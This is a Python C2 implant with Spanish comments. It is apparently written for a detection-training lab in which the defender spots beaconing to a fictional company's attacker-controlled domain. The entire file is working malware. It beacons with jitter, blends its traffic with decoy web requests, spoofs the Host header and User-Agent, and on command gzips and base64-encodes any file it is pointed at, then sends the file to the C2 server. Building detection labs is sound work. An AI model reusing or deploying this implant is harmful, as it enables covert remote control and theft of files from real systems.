#!/usr/bin/env python3
"""
Implante en un endpoint comprometido de Northwind Global Systems.

Habla con el C2 por HTTP con un patrón malleable-C2: hace check-ins periódicos
(beaconing) con jitter, camuflados entre navegación web benigna. Envía una
cookie de sesión (base64) y un User-Agent distintivo. Cuando el C2 lo tasquea,
lee un fichero sensible, lo comprime (gzip) y lo codifica (base64) y lo sube.

El fallo a detectar no es un exploit: es el patrón de C2. Periodicidad regular
al mismo endpoint, misma cookie/UA, y resultados codificados por capas
(MITRE ATT&CK T1071.001 / T1132.001 / T1041).
"""
import base64
import gzip
import http.client
import json
import os
import random
import time

C2_HOST = os.environ.get("C2_HOST", "c2")
C2_PORT = int(os.environ.get("C2_PORT", "80"))
C2_DOMAIN = os.environ.get("C2_DOMAIN", "cdn-edge-sync.net")
BEACONS = int(os.environ.get("BEACONS", "12"))
INTERVAL = float(os.environ.get("BEACON_INTERVAL", "3"))
JITTER = float(os.environ.get("BEACON_JITTER", "0.4"))   # ±40 %
START_DELAY = int(os.environ.get("START_DELAY", "6"))

SESSION = os.environ.get("SESSION_ID", "NW-WKS-014:af93c1")
USER_AGENT = os.environ.get(
    "IMPLANT_UA",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) GhostClient/2.3",
)
BENIGN_PATHS = ["/", "/assets/app.js", "/assets/app.css", "/favicon.ico"]


def log(msg):
    print(msg, flush=True)


def b64(s):
    return base64.b64encode(s.encode() if isinstance(s, str) else s).decode()


def conn():
    return http.client.HTTPConnection(C2_HOST, C2_PORT, timeout=6)


def _headers(extra=None):
    # Host apunta al dominio del atacante aunque conectemos al contenedor 'c2'.
    h = {"Host": C2_DOMAIN, "User-Agent": USER_AGENT}
    if extra:
        h.update(extra)
    return h


def wait_for_c2(retries=40):
    for _ in range(retries):
        try:
            c = conn()
            c.request("GET", "/health", headers=_headers())
            c.getresponse().read()
            c.close()
            return
        except OSError:
            time.sleep(1)
    raise SystemExit(f"[implant] el C2 {C2_HOST}:{C2_PORT} no responde")


def benign():
    c = conn()
    c.request("GET", random.choice(BENIGN_PATHS), headers=_headers())
    c.getresponse().read()
    c.close()


def beacon():
    """Un check-in. Devuelve la tarea decodificada (texto)."""
    c = conn()
    cookie = f"SESSIONID={b64(SESSION)}"
    c.request("GET", "/api/v2/status", headers=_headers({"Cookie": cookie, "Accept": "application/json"}))
    body = c.getresponse().read()
    c.close()
    try:
        task_b64 = json.loads(body).get("task", "")
        return base64.b64decode(task_b64).decode("utf-8", "replace")
    except Exception:
        return ""


def exfiltrate(path):
    with open(path, "rb") as fh:
        raw = fh.read()
    packed = base64.b64encode(gzip.compress(raw))
    log(f"[implant] exfiltrando '{os.path.basename(path)}' ({len(raw)} bytes -> {len(packed)} b64+gzip)")
    c = conn()
    c.request("POST", "/api/v2/submit", body=packed,
              headers=_headers({"Cookie": f"SESSIONID={b64(SESSION)}",
                                "Content-Type": "application/octet-stream"}))
    c.getresponse().read()
    c.close()


def main():
    time.sleep(START_DELAY)
    wait_for_c2()
    log(f"[implant] C2={C2_DOMAIN} ({C2_HOST}:{C2_PORT}) UA='{USER_AGENT}' beacons={BEACONS}")
    for i in range(1, BEACONS + 1):
        if random.random() < 0.5:
            benign()                       # ruido web intercalado
        task = beacon()
        log(f"[implant] beacon #{i}/{BEACONS} -> tarea='{task}'")
        if task.startswith("exfil"):
            target = task.split(" ", 1)[1].strip()
            exfiltrate(target)
        time.sleep(max(0.2, INTERVAL * (1 + random.uniform(-JITTER, JITTER))))
    benign()
    log("[implant] campaña completada. Fin.")


if __name__ == "__main__":
    main()
